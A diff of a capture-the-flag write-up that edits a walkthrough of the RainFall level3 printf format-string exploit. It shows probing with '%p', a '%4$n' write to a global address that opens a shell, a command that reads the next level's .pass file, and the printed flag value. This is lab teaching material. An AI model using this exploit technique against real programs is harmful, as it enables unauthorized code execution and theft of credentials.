@@ -16,11 +16,12 @@ level3@RainFall:~$ ./level3
 ```
 Odd, we're getting the value of the argument of fgets and what strongly looks like stack addresses, which means....
 
+We know that the ascii of value value of 0 is `0x30`, let's try inserting a bunch of zeroes at the start of our buffer:
 ```shell
 level3@RainFall:~$ ./level3 <<< `python -c 'print "0000" + "%p "*10'`
 00000x200 0xb7fd1ac0 0xb7ff37d0 0x30303030 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520
 ```
-we can see that the 4th pointer gets modified by our printf format string, nice!
+We can see that the 4th pointer gets modified by our printf format string as it's made of four zeroes (0x30303030), nice!
 
 Let's simplify our string a bit now that we know which argument we can act on
 
@@ -59,10 +60,12 @@ Wait what?!
 We won! we just need to find a way to keep the shell open now.
 
 ## Putting it together
-We can add `"A"*4028` followed with our glorious command to get the password, it is just a way to wait until the shell is ready to read from stdin again.
+Sadly `struct.pack()` doesn't really work to send our data to stdin in time, instead we've got to write `0x804988c` in little-endian manually.
 
 ```shell
-level3@RainFall:~$ ./level3 <<< `python -c 'import struct; print struct.pack("<Q", 0x804988c) + "a"*60 + "%4$n" + "A"*4028 + "cat /home/user/level4/.pass"'`
-aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAWait what?!
+level3@RainFall:~$ (python -c 'print "\x8c\x98\x04\x08" + "a"*60 + "%4$n"' ; cat -) | ./level3
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+Wait what?!
+cat /home/user/level4/.pass
 b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
 ```
